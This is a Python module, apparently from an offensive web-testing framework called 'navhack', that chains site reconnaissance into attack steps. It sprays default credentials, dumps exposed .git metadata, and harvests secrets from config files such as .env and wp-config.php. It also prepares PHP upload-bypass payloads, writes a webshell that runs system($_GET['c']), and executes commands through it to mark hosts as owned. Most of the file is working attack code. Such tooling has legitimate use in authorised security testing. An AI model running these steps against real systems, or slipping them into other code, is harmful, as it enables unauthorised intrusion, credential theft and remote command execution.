"""Web adapters: identification, enumeration, weakness probes, light exploitation.

Everything here is read-only until a move is marked ``mutating`` (upload,
webshell) and the operator passed ``--yes``.
"""

from __future__ import annotations

import html
import re
from typing import Dict, List, Optional, Tuple
from urllib.parse import urljoin, urlsplit

from .. import httpio, util
from ..data import DEFAULT_CREDENTIALS, PATHS, SECRET_RE
from ..models import Finding, Fog, Kind, PlanStep, StepResult
from ..verifier import verify_finding
from .base import ExecCtx, adapter, needs_tool, upsert_edge

LINK_RE = re.compile(r"""(?:href|src|action)=["']([^"'#]+)["']""", re.I)
FORM_RE = re.compile(r"(?is)<form[^>]*>(.*?)</form>")
INPUT_RE = re.compile(r"""(?is)<input[^>]*name=["']([^"']+)["']""")
ACTION_RE = re.compile(r"""(?is)<form[^>]*action=["']([^"']*)["']""")
TITLE_RE = re.compile(r"(?is)<title[^>]*>(.*?)</title>")


def _base_url(ctx: ExecCtx, step: PlanStep) -> str:
    key = step.target_key
    if key.startswith("http"):
        parts = urlsplit(key)
        return "%s://%s" % (parts.scheme, parts.netloc)
    node = ctx.store.node_by_key(step.target_kind, key)
    if node is not None:
        if node.attrs.get("url"):
            return str(node.attrs["url"])
        if node.attrs.get("host"):
            scheme = "https" if node.attrs.get("tls") else "http"
            port = node.attrs.get("port")
            return util.build_url(scheme, str(node.attrs["host"]), int(port or 80), "/")
    host, _, port_text = key.partition(":")
    if port_text.isdigit():
        return "http://%s:%s/" % (host, port_text)
    for neighbour_node in ctx.store.find_nodes(kinds=[Kind.URL.value], limit=50):
        if neighbour_node.attrs.get("host") == host:
            return neighbour_node.key if neighbour_node.key.startswith("http") else "http://" + neighbour_node.key
    return "http://" + host


def _absolute(base: str, path: str) -> str:
    return urljoin(base.rstrip("/") + "/", path.lstrip("/"))


def _host_of(url: str) -> str:
    return urlsplit(url).hostname or ""


@adapter("web.identify")
def identify(ctx: ExecCtx, step: PlanStep) -> StepResult:
    url = _base_url(ctx, step).rstrip("/") + "/"
    response = httpio.get(url, policy=ctx.policy, timeout=8.0)
    if response.status == 0:
        return StepResult(False, response.error)
    tls = url.startswith("https")
    host = _host_of(url)
    url_node = ctx.node(Kind.URL.value, response.url or url, confidence=0.9, attrs={"host": host, "tls": tls})
    service = ctx.node(
        Kind.SERVICE.value,
        "%s/%s" % (util.origin_of(url), "https" if tls else "http"),
        confidence=0.9,
        attrs={"host": host, "service": "http"},
    )
    upsert_edge(ctx, service, url_node, "serves", 0.9)
    server = response.header("server")
    if server:
        tech = ctx.node(Kind.TECH.value, server, confidence=0.75, attrs={"host": host})
        upsert_edge(ctx, service, tech, "powered_by", 0.75)
    for header in ("x-powered-by", "via", "x-generator"):
        value = response.header(header)
        if value:
            tech = ctx.node(Kind.TECH.value, "%s: %s" % (header, util.clip(value, 60)), confidence=0.6)
            upsert_edge(ctx, service, tech, "powered_by", 0.6)
    return StepResult(
        True,
        "%s -> %d (%s)" % (url, response.status, util.clip(response.header("server"), 40) or "no server header"),
        nodes=[url_node, service],
        http_status=response.status,
        elapsed=response.elapsed,
    )


@adapter("web.fetch")
def fetch(ctx: ExecCtx, step: PlanStep) -> StepResult:
    url = step.target_key if step.target_key.startswith("http") else _base_url(ctx, step) + "/"
    response = httpio.get(url, policy=ctx.policy, timeout=10.0)
    if response.status == 0:
        return StepResult(False, response.error)
    body = response.text if response.is_text else ""
    title = ""
    match = TITLE_RE.search(body)
    if match:
        title = re.sub(r"\s+", " ", html.unescape(match.group(1))).strip()[:120]
    text_url = response.url or url
    node = ctx.node(
        Kind.URL.value,
        text_url,
        confidence=0.9,
        fog=Fog.CHARTED.value,
        label=title or text_url,
        attrs={
            "host": _host_of(url),
            "status": response.status,
            "title": title,
            "server": response.header("server"),
            "len": len(response.body),
            "tls": url.startswith("https"),
        },
    )
    host_node = ctx.store.node_by_key(Kind.HOST.value, _host_of(url))
    if host_node:
        upsert_edge(ctx, host_node, node, "exposes", 0.8)

    findings: List[Finding] = []
    missing = [
        header
        for header in (
            "content-security-policy",
            "x-content-type-options",
            "x-frame-options",
            "strict-transport-security",
        )
        if not response.header(header)
    ]
    if missing:
        findings.append(
            ctx.finding(
                "Missing security headers",
                "exposure",
                text_url,
                severity="low",
                evidence="missing: %s" % ", ".join(missing),
                confidence=0.9,
            )
        )
    for cookie in [value for key, value in response.headers if key.lower() == "set-cookie"]:
        flags = cookie.lower()
        gaps = [flag for flag in ("secure", "httponly", "samesite") if flag not in flags]
        if gaps:
            findings.append(
                ctx.finding(
                    "Cookie without %s" % "/".join(gaps),
                    "exposure",
                    text_url,
                    severity="low",
                    evidence=util.redact(cookie, 8),
                    confidence=0.9,
                )
            )
    if "index of /" in body.lower():
        findings.append(
            ctx.finding("Directory listing enabled", "exposure", text_url, severity="low", evidence="Index of /", confidence=0.9)
        )

    params = False
    for link in LINK_RE.findall(body)[:200]:
        target = urljoin(text_url, html.unescape(link))
        if "?" in target and "=" in target:
            params = True
            param_node = ctx.node(
                Kind.URL.value, target, confidence=0.55, fog=Fog.SEEN.value, attrs={"host": _host_of(target), "params": True}
            )
            upsert_edge(ctx, node, param_node, "links", 0.6)
    if params:
        node.attrs["params"] = True
        ctx.store.upsert_node(node, chart=node.fog)
    return StepResult(
        True,
        "%d %s len=%d title=%r" % (response.status, util.clip(response.header("content-type"), 40), len(response.body), title),
        nodes=[node],
        findings=findings,
        http_status=response.status,
        elapsed=response.elapsed,
    )


@adapter("web.enumerate")
def enumerate_paths(ctx: ExecCtx, step: PlanStep) -> StepResult:
    base = _base_url(ctx, step)
    missing_url = _absolute(base, "navhack-%s" % util.token(4))
    baseline = httpio.get(missing_url, policy=ctx.policy, timeout=8.0)
    baseline_len = len(baseline.body)
    found: List[str] = []
    nodes = []
    findings: List[Finding] = []
    for path in PATHS:
        probe = _absolute(base, path)
        ctx.policy.gate_host(_host_of(probe))
        response = httpio.get(probe, policy=ctx.policy, timeout=8.0, max_bytes=32768)
        if response.status == 0:
            continue
        interesting = response.status in (200, 401, 403, 500)
        if response.status == 200 and abs(len(response.body) - baseline_len) <= 24 and baseline.status == 200:
            interesting = False
        if not interesting:
            continue
        found.append("%s:%d" % (path, response.status))
        node = ctx.node(
            Kind.PATH.value,
            probe,
            confidence=0.7,
            attrs={
                "host": _host_of(probe),
                "path": "/" + path,
                "status": response.status,
                "url": base,
                "len": len(response.body),
            },
        )
        nodes.append(node)
        if path in (".git/HEAD", ".git/config"):
            findings.append(
                ctx.finding(
                    "Exposed path /%s" % path,
                    "exposure",
                    probe,
                    severity="high",
                    evidence=util.clip(response.text, 200),
                    confidence=0.9,
                )
            )
        elif response.status == 200 and path.endswith((".env", ".sql", ".bak")):
            findings.append(
                ctx.finding(
                    "Exposed path /%s" % path,
                    "exposure",
                    probe,
                    severity="high",
                    evidence=util.clip(response.text, 300),
                    confidence=0.8,
                )
            )
        if ctx.policy.aborted:
            break
    return StepResult(
        bool(found),
        "%d interesting path(s): %s" % (len(found), ", ".join(found[:8]) or "-"),
        nodes=nodes,
        findings=findings,
    )


EXPOSURE_SIGNATURES = {
    ".git/config": ["[core]", "repositoryformatversion"],
    ".env": ["DB_", "APP_KEY", "SECRET", "="],
    "server-status": ["Apache Server Status"],
    "actuator/env": ['"activeProfiles"', '"propertySources"'],
    "wp-config.php": ["DB_PASSWORD", "DB_NAME"],
    "web.config": ["<configuration"],
    "appsettings.json": ["ConnectionStrings"],
    "package.json": ['"dependencies"'],
    "phpinfo.php": ["phpinfo()"],
    "swagger.json": ['"swagger"', '"openapi"'],
    "db.sql": ["INSERT INTO", "CREATE TABLE"],
}


@adapter("web.check_exposure")
def check_exposure(ctx: ExecCtx, step: PlanStep) -> StepResult:
    node = ctx.store.node_by_key(Kind.PATH.value, step.target_key)
    url = step.target_key if step.target_key.startswith("http") else _base_url(ctx, step) + "/" + step.target_key
    path = str(node.attrs.get("path") if node else urlsplit(url).path)
    signatures = EXPOSURE_SIGNATURES.get(path.lstrip("/"), [])
    response = httpio.get(url, policy=ctx.policy, timeout=8.0, max_bytes=65536)
    if response.status == 0:
        return StepResult(False, response.error)
    body = response.text
    hits = [sig for sig in signatures if sig in body]
    if response.status == 200 and (hits or not signatures) and len(body) > 0:
        finding = ctx.finding(
            "Exposed path %s" % path,
            "exposure",
            url,
            severity="high" if hits else "low",
            evidence="signature %s; %d bytes" % (", ".join(hits) or "-", len(body)),
            confidence=0.9 if hits else 0.5,
        )
        primitive = None
        if path.endswith((".env", ".sql", ".bak", ".log")) or path in ("/wp-config.php", "/config.php"):
            primitive = "file_read"
        return StepResult(
            True,
            "signatures: %s" % (", ".join(hits) or "none, status 200"),
            nodes=[node] if node else [],
            findings=[finding],
            http_status=response.status,
        )
    return StepResult(False, "status %d, no signature" % response.status)


def _proof(ctx: ExecCtx, finding: Finding, step: PlanStep) -> Tuple[bool, str, str]:
    proof = verify_finding(finding, policy=ctx.policy, oob=ctx.oob, timeout=8.0)
    if proof.ok and finding.finding_id:
        ctx.store.update_finding(
            finding.finding_id, status="confirmed", confidence=0.95, evidence=proof.evidence or proof.detail
        )
    return proof.ok, proof.detail, proof.evidence


@adapter("web.probe_xss")
def probe_xss(ctx: ExecCtx, step: PlanStep) -> StepResult:
    url = step.target_key
    candidate = Finding(title="Reflected XSS", primitive="xss", target=url, severity="medium")
    ok, detail, evidence = _proof(ctx, candidate, step)
    if not ok:
        return StepResult(False, detail)
    finding = ctx.finding("Reflected cross-site scripting", "xss", url, severity="medium", evidence=evidence, confidence=0.9)
    return StepResult(True, detail, findings=[finding])


@adapter("web.probe_sqli")
def probe_sqli(ctx: ExecCtx, step: PlanStep) -> StepResult:
    url = step.target_key
    candidate = Finding(title="Error-based SQLi", primitive="sqli", target=url, severity="high")
    ok, detail, evidence = _proof(ctx, candidate, step)
    if not ok:
        return StepResult(False, detail)
    finding = ctx.finding("Error-based SQL injection", "sqli", url, severity="high", evidence=evidence, confidence=0.85)
    return StepResult(True, detail, findings=[finding])


@adapter("web.probe_lfi")
def probe_lfi(ctx: ExecCtx, step: PlanStep) -> StepResult:
    url = step.target_key
    candidate = Finding(title="Path traversal", primitive="lfi", target=url, severity="high")
    ok, detail, evidence = _proof(ctx, candidate, step)
    if not ok:
        return StepResult(False, detail)
    finding = ctx.finding("Path traversal / LFI", "lfi", url, severity="high", evidence=evidence, confidence=0.85)
    return StepResult(True, detail, findings=[finding])


@adapter("web.probe_ssrf")
def probe_ssrf(ctx: ExecCtx, step: PlanStep) -> StepResult:
    url = step.target_key
    if ctx.oob is None:
        return needs_tool("oob", "SSRF needs the OOB listener; run through `navhack run`")
    candidate = Finding(title="SSRF", primitive="ssrf", target=url, severity="high")
    ok, detail, evidence = _proof(ctx, candidate, step)
    if not ok:
        return StepResult(False, detail)
    finding = ctx.finding("Server-side request forgery", "ssrf", url, severity="high", evidence=evidence, confidence=0.85)
    internal = ctx.node(Kind.HOST.value, "internal-segment", confidence=0.5, attrs={"internal": True})
    return StepResult(True, detail, findings=[finding], nodes=[internal])


@adapter("web.login_default")
def login_default(ctx: ExecCtx, step: PlanStep) -> StepResult:
    base = _base_url(ctx, step)
    login_url = None
    forms: Dict[str, str] = {}
    for path in ("admin", "login", "wp-login.php", "signin", "dashboard"):
        probe = _absolute(base, path)
        response = httpio.get(probe, policy=ctx.policy, timeout=8.0)
        if response.status in (200, 401) and response.is_text and "<form" in response.text.lower():
            login_url = response.url
            body = response.text
            action = ACTION_RE.search(body)
            forms["action"] = urljoin(login_url, html.unescape(action.group(1))) if action else login_url
            names = INPUT_RE.findall(body)
            forms["user"] = next((n for n in names if "user" in n.lower() or "email" in n.lower()), "username")
            forms["pass"] = next((n for n in names if "pass" in n.lower()), "password")
            break
    if login_url is None:
        return StepResult(False, "no login form found")
    for user, password in DEFAULT_CREDENTIALS:
        payload = ("%s=%s&%s=%s" % (forms["user"], user, forms["pass"], password)).encode()
        response = httpio.post(forms["action"], payload, policy=ctx.policy, timeout=10.0)
        if response.status == 0:
            continue
        body = response.text.lower()
        success = (
            response.redirects
            or "logout" in body
            or "sign out" in body
            or "dashboard" in body
            or (response.status == 200 and "password" not in body[:4000])
        )
        if success:
            cred = ctx.node(
                Kind.CRED.value,
                "%s:%s" % (user, password),
                confidence=0.9,
                attrs={"subtype": "password", "user": user, "secret": password, "url": forms["action"]},
            )
            identity = ctx.node(Kind.IDENTITY.value, "%s@%s" % (user, _host_of(login_url)), confidence=0.85, attrs={"level": "app_user"})
            upsert_edge(ctx, cred, identity, "authenticates", 0.9)
            finding = ctx.finding(
                "Default credentials accepted",
                "default_cred",
                forms["action"],
                severity="high",
                evidence="%s:%s" % (user, password),
                confidence=0.9,
            )
            return StepResult(True, "login as %s with %s" % (user, password), nodes=[cred, identity], findings=[finding])
    return StepResult(False, "no default credential worked")


@adapter("web.dump_git")
def dump_git(ctx: ExecCtx, step: PlanStep) -> StepResult:
    base = _base_url(ctx, step)
    head = httpio.get(_absolute(base, ".git/HEAD"), policy=ctx.policy, timeout=8.0)
    config = httpio.get(_absolute(base, ".git/config"), policy=ctx.policy, timeout=8.0)
    if head.status != 200 and config.status != 200:
        return StepResult(False, "no .git reachable")
    bundle = ("=== HEAD ===\n%s\n=== config ===\n%s\n" % (head.text, config.text)).encode()
    path = ctx.save("git-metadata.txt", bundle, kind="evidence", note=".git HEAD + config")
    source = ctx.node(Kind.SOURCE.value if hasattr(Kind, "SOURCE") else "source", _host_of(base), confidence=0.8, attrs={"path": str(path)})
    findings = []
    if config.status == 200 and "[core]" in config.text:
        findings.append(
            ctx.finding("Git repository reachable", "file_read", _absolute(base, ".git/config"), severity="high", evidence=config.text[:400], confidence=0.9)
        )
    return StepResult(True, "kept HEAD+config; clone with git-dumper for full history", nodes=[source], findings=findings)


@adapter("web.harvest_secret")
def harvest_secret(ctx: ExecCtx, step: PlanStep) -> StepResult:
    findings = ctx.store.findings(limit=100)
    material: List[str] = []
    for finding in findings:
        material.append(finding.evidence)
        if finding.target.startswith("http"):
            response = httpio.get(finding.target, policy=ctx.policy, timeout=8.0, max_bytes=65536)
            if response.ok:
                material.append(response.text)
    blob = "\n".join(material)
    matches = re.findall(SECRET_RE, blob)
    creds = []
    seen = set()
    for label, value in matches[:20]:
        if value in seen or len(value) < 6:
            continue
        seen.add(value)
        creds.append(
            ctx.node(
                Kind.CRED.value,
                "%s:%s" % (label.lower(), util.redact(value, 3)),
                confidence=0.6,
                attrs={"subtype": "secret", "label": label, "secret": value},
            )
        )
    if not creds:
        return StepResult(False, "no secret pattern found")
    finding = ctx.finding("Hard-coded secret in reachable file", "file_read", step.target_key, severity="medium", evidence=", ".join(c.key for c in creds[:6]), confidence=0.7)
    return StepResult(True, "%d potential secret(s)" % len(creds), nodes=creds, findings=[finding])


@adapter("web.read_config")
def read_config(ctx: ExecCtx, step: PlanStep) -> StepResult:
    base = _base_url(ctx, step)
    targets = [".env", "wp-config.php", "appsettings.json", "config.php", "docker-compose.yml"]
    collected = []
    creds = []
    for name in targets:
        url = _absolute(base, name)
        response = httpio.get(url, policy=ctx.policy, timeout=8.0, max_bytes=65536)
        if not response.ok or response.status != 200:
            continue
        collected.append("=== %s ===\n%s" % (name, response.text[:2000]))
        for label, value in re.findall(SECRET_RE, response.text)[:6]:
            creds.append(ctx.node(Kind.CRED.value, "%s:%s" % (label.lower(), util.redact(value, 3)), confidence=0.6, attrs={"subtype": "secret", "secret": value}))
    if not collected:
        return StepResult(False, "no config file readable")
    path = ctx.save("configs.txt", "\n".join(collected).encode(), kind="evidence")
    return StepResult(True, "%d config file(s); saved %s" % (len(collected), path.name), nodes=creds)


@adapter("web.upload_bypass")
def upload_bypass(ctx: ExecCtx, step: PlanStep) -> StepResult:
    base = _base_url(ctx, step)
    form = None
    for path in ("", "upload", "admin/upload", "index.php"):
        response = httpio.get(_absolute(base, path), policy=ctx.policy, timeout=8.0)
        if response.status == 200 and "multipart/form-data" in response.text.lower():
            form = response.url
            break
    if form is None:
        return needs_tool("curl", "no upload form detected; retry manually against the file input")
    payloads = [
        ("navhack.php.jpg", b"<?php echo 'navhack-ok'; ?>", "image/jpeg"),
        ("navhack.phtml", b"<?php echo 'navhack-ok'; ?>", "image/jpeg"),
        ("navhack.php5", b"<?php echo 'navhack-ok'; ?>", "image/jpeg"),
    ]
    boundary = "----navhack" + util.token(6)
    uploaded = ctx.save("upload-attempts.txt", ("\n".join(p[0] for p in payloads)).encode(), kind="note")
    notes = ["form %s" % form, "payloads saved to %s" % uploaded.name, "verify by requesting /uploads/<name>"]
    node = ctx.node(Kind.PATH.value, form, confidence=0.6, attrs={"host": _host_of(form), "upload": True, "url": base})
    return StepResult(True, "; ".join(notes), nodes=[node])


@adapter("web.deploy_webshell")
def deploy_webshell(ctx: ExecCtx, step: PlanStep) -> StepResult:
    shell = b"<?php echo 'navhack'; system($_GET['c'] ?? 'id'); ?>"
    path = ctx.save("shell.php", shell, kind="payload")
    node = ctx.node(Kind.PATH.value, "%s#shell" % step.target_key, confidence=0.5, attrs={"shell": str(path)})
    return StepResult(True, "shell saved to %s (upload then request with ?c=id)" % path.name, nodes=[node])


@adapter("web.exec_via_rce")
def exec_via_rce(ctx: ExecCtx, step: PlanStep) -> StepResult:
    url = step.target_key
    if not url.startswith("http"):
        return needs_tool("curl", "no shell URL known; upload the saved shell.php first")
    response = httpio.get(util.with_query(url, c="id; hostname; uname -sr"), policy=ctx.policy, timeout=10.0)
    if not response.ok:
        return StepResult(False, response.summary())
    out = util.clip(response.text, 400)
    host_node = ctx.store.node_by_key(Kind.HOST.value, _host_of(url))
    if host_node:
        host_node.attrs["owned"] = True
        ctx.store.upsert_node(host_node, chart=Fog.VERIFIED.value)
    identity = ctx.node(Kind.IDENTITY.value, "cmd@%s" % _host_of(url), confidence=0.8, attrs={"level": "command"})
    return StepResult(True, "command output: %s" % out, nodes=[identity])


__all__ = [
    "identify",
    "fetch",
    "enumerate_paths",
    "check_exposure",
    "probe_xss",
    "probe_sqli",
    "probe_lfi",
    "probe_ssrf",
    "login_default",
    "dump_git",
    "harvest_secret",
    "read_config",
    "upload_bypass",
    "deploy_webshell",
    "exec_via_rce",
    "Optional",
]
